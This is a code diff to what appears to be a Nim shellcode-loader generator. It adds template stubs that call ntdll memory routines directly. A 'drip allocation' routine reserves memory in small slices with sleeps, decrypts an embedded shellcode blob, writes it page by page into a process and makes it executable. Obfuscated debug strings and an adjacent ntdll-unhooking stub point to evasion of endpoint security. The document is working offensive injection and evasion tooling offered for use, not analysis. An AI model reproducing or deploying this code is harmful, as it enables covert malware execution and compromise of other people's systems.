@@ -141,9 +141,19 @@ proc restoreBytes(hProc: HANDLE, addressToHook: LPVOID): bool =
 
 """
 
-let DripAllocateStub * = """
+let DripAllocateStubFirst * = """
 
-const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000000DDDD0000),
+proc ANtAVM(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS
+    {.discardable, stdcall, dynlib: "ntdll", importc: "NtAllocateVirtualMemory".}
+
+proc ANtWVM(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS
+    {.discardable, stdcall, dynlib: "ntdll", importc: "NtWriteVirtualMemory".}
+
+proc ANtPVM(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS
+    {.discardable, stdcall, dynlib: "ntdll", importc: "NtProtectVirtualMemory".}
+
+const VC_PREF_BASES: seq[pointer] = @[cast[pointer](0x00000007FFFF0000),
+    cast[pointer](0x00000000DDDD0000),
     cast[pointer](0x0000000010000000),
     cast[pointer](0x0000000021000000),
     cast[pointer](0x0000000032000000),
@@ -158,124 +168,187 @@ proc GetSuitableBaseAddress(hProc: HANDLE, szPage: DWORD, szAllocGran: DWORD, cV
     var mbi: MEMORY_BASIC_INFORMATION
 
     for base in VC_PREF_BASES:
-        echo "Calling VirtualQueryEx for address ", repr(base), " with size ", sizeof(mbi).SIZE_T
+        when defined(verbose):
+            echo obf("[*] Calling VirtualQueryEx for address "), repr(base), obf(" with size "), sizeof(mbi).SIZE_T
         VirtualQueryEx(hProc, cast[LPVOID](base), addr mbi, sizeof(mbi).SIZE_T)
-        echo "GetLastError: ", GetLastError()
+        #echo "GetLastError: ", GetLastError()
         if mbi.State == MEM_FREE:
             var i: DWORD = 0
             while i < cVmResv:
                 let currentBase = cast[LPVOID](cast[DWORD_PTR](base) + i * szAllocGran)
-                echo "Checking CurrentBase: ", repr(currentBase)
-                echo "Moar VirtualQueryEx"
+                when defined(verbose):
+                    echo obf("[*] Checking CurrentBase plus offset: "), repr(currentBase)
                 VirtualQueryEx(hProc, currentBase, addr mbi, sizeof(mbi).SIZE_T)
                 i += 1
                 if mbi.State != MEM_FREE:
-                    echo "Mem not free"
+                    when defined(verbose):
+                        echo obf("[-] Mem not free")
                     break
                 else:
-                    echo "Mem free"
+                    when defined(verbose):
+                        echo obf("[+] Mem free")
             if i == cVmResv:
                 # found suitable base
                 return cast[LPVOID](base)
 
     result = nil
 
-proc DripAllocate(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: SIZE_T, Protect: ULONG): bool =
-    var sys_inf: SYSTEM_INFO
-    echo "Getting Infos"
-    GetSystemInfo(addr sys_inf)
-    echo "Got Infos"
-    var page_size: DWORD = sys_inf.dwPageSize
-    var alloc_gran: DWORD = sys_inf.dwAllocationGranularity
+"""
 
-    if page_size == 0:
-        page_size = 0x1000
+let DripAllocateStubSecond * = """
 
-    if alloc_gran == 0:
-        alloc_gran = 0x10000
-    
-    var cVmResv: DWORD = DWORD((DWORD(RegionSize) / alloc_gran) + 1)
-    echo "Going to allocate for ", cVmResv, " times"
-    echo "Allocation Granularity: ", alloc_gran
-    var vmBaseAddress: LPVOID = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, cVmResv)
+    proc DripAllocate(ProcessHandle: HANDLE, RegionSize: SIZE_T, scArray: openarray[byte]): LPVOID =
+        
+        var protectionValue: DWORD = PAGE_EXECUTE_READWRITE
+        
+        when defined(RX):
+            protectionValue = PAGE_EXECUTE_READ
+        
+        var sys_inf: SYSTEM_INFO
+        GetSystemInfo(addr sys_inf)
+        var page_size: DWORD = sys_inf.dwPageSize
+        var alloc_gran: DWORD = sys_inf.dwAllocationGranularity
 
-    if vmBaseAddress == nil:
-        return false
-    else:
-        return true
-    #[
-    var status: NTSTATUS = 0
-    var cmm_i: DWORD
-    var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)
+        if page_size == 0:
+            page_size = 0x1000
 
-    var vcVmResv: seq[LPVOID] = @[]
+        if alloc_gran == 0:
+            alloc_gran = 0x10000
+        
+        var numberOfAllocations: DWORD = DWORD((DWORD(RegionSize) / alloc_gran) + 1)
+        when defined(verbose):
+            echo obf("[*] Shellcode size: "), RegionSize
+            echo obf("[*] Allocation Granularity: "), alloc_gran
+            echo obf("[*] Going to allocate for "), numberOfAllocations, obf(" times")
+        var vmBaseAddress: LPVOID = GetSuitableBaseAddress(ProcessHandle, page_size, alloc_gran, numberOfAllocations)
 
-    # Reserve enough memory
-    var i: DWORD
-    for i in 1..cVmResv:
-        Sleep(1)
-
-        status = ANtAVM(
-            hProc,
-            addr currentVmBase,
-            nil,
-            addr szVmResv,
-            MEM_RESERVE,
-            PAGE_NOACCESS
-        )
-
-        if status == STATUS_SUCCESS:
-            vcVmResv.add(currentVmBase)
+        if vmBaseAddress == nil:
+            when defined(verbose):
+                echo obf("[-] GetSuitableBaseAddress failed")
+            return nil
         else:
-            return 4
+            when defined(verbose):
+                echo obf("[+] GetSuitableBaseAddress succeeded")
+                echo obf("[*] Base address: "), repr(vmBaseAddress)
+        
+        var status: NTSTATUS = 0
+        var cmm_i: DWORD
+        var currentVmBase: LPVOID = cast[LPVOID](vmBaseAddress)
 
-        currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + szVmResv)
+        var vcVmResv: seq[LPVOID] = @[]
+        var sc_size: SIZE_T = cast[SIZE_T](alloc_gran)
 
-    var offsetSc: DWORD = 0
-    var oldProt: DWORD
-
-    # Loop over the pages and commit our sc blob in 4kB slices
-    var prcDone: float = 0.0
-    for i in 0..<cVmResv:
-        for cmm_i in 0..<cVmCmm:
-            prcDone += 1.0 / (cVmResv * cVmCmm)
-
-            let offset = cmm_i * szVmCmm
-            currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
+        # Reserve enough memory
+        var i: DWORD
+        for i in 1..numberOfAllocations:
+            Sleep(1)
 
             status = ANtAVM(
-                hProc,
+                ProcessHandle,
                 addr currentVmBase,
-                nil,
-                addr szVmCmm,
-                MEM_COMMIT,
-                PAGE_READWRITE
-                )
+                0,
+                &sc_size,
+                MEM_RESERVE,
+                PAGE_NOACCESS #[PAGE_EXECUTE_READ_WRITE]#
+            )
 
-            Sleep(1)
+            if status == STATUS_SUCCESS:
+                when defined(verbose):
+                    echo obf("[+] NtAllocateVirtualMemory succeeded")
+                vcVmResv.add(currentVmBase)
+            else:
+                when defined(verbose):
+                    echo obf("[-] NtAllocateVirtualMemory failed")
+                return nil
 
-            var szWritten: SIZE_T = 0
+            currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
+        
+        var offsetSc: DWORD = 0
+        var oldProt: DWORD
 
-            status = ANtWVM(
-                hProc,
-                currentVmBase,
-                addr shellcode[offsetSc],
-                szVmCmm,
-                addr szWritten
-                )
+        # Loop over the pages and commit our sc blob in 4kB slices
+        
+        var sizeOfPage: SIZE_T = cast[SIZE_T](page_size)
 
-            Sleep(1)
+        var memoryCalc: DWORD = DWORD(DWORD(sc_size) / DWORD(sizeOfPage))
+        
+        when defined(localinject):
+            ptrEncText = cast[ptr byte](unsafeAddr scArray)
+            ptrDecText = cast[ptr byte](unsafeAddr scArray)
+            decryptlate()
+        else:
+            ptrEncText = cast[ptr byte](addr encText[0])
+            ptrDecText = cast[ptr byte](addr decText[0])
+            decryptlate()
 
-            offsetSc += szVmCmm
+        for i in 0..<numberOfAllocations:
+            for cmm_i in 0..<memoryCalc:
+                
+                let offset = cmm_i * sizeOfPage
+                currentVmBase = cast[LPVOID](cast[DWORD_PTR](vcVmResv[i]) + offset)
 
-            status = ANtPVM(
-                hProc,
-                addr currentVmBase,
-                addr szVmCmm,
-                PAGE_EXECUTE_READ,
-                addr oldProt
-                ) ]#
+                status = ANtAVM(
+                    ProcessHandle,
+                    addr currentVmBase,
+                    0,
+                    addr sizeOfPage,
+                    MEM_COMMIT,
+                    PAGE_READWRITE
+                    )
+                
+                if(status != STATUS_SUCCESS):
+                    when defined(verbose):
+                        echo obf("[-] NtAllocateVirtualMemory failed")
+                    return nil
+                else:
+                    when defined(verbose):
+                        echo obf("\r\n[+] NtAllocateVirtualMemory succeeded")
+                        echo obf("[*] Address: "), repr(currentVmBase)
 
+                Sleep(1)
+
+                var szWritten: SIZE_T = 0
+
+                status = ANtWVM(
+                    ProcessHandle,
+                    currentVmBase,
+                    unsafeAddr scArray[offsetSc],
+                    sizeOfPage,
+                    addr szWritten
+                    )
+                
+                if(status != STATUS_SUCCESS):
+                    when defined(verbose):
+                        echo obf("[-] NtWriteVirtualMemory failed")
+                    return nil
+                else:
+                    when defined(verbose):
+                        echo obf("[+] NtWriteVirtualMemory succeeded")
+                        echo obf("[*] Address: "), repr(currentVmBase)
+
+                Sleep(1)
+
+                offsetSc += DWORD(sizeOfPage)
+
+                status = ANtPVM(
+                    ProcessHandle,
+                    addr currentVmBase,
+                    addr sizeOfPage,
+                    protectionValue #[RX or RWX depending on operators choice]#,
+                    addr oldProt
+                    )
+                
+                if(status != STATUS_SUCCESS):
+                    when defined(verbose):
+                        echo obf("[-] NtProtectVirtualMemory failed")
+                    return nil
+                else:
+                    when defined(verbose):
+                        echo obf("[+] NtProtectVirtualMemory succeeded")
+                        echo obf("[*] Address: "), repr(currentVmBase)
+        #write(stdout, "This is the prompt -> ")
+        #var input = readLine(stdin)
+        return vmBaseAddress
 """
 
 let UnhookNtdllStub * = """
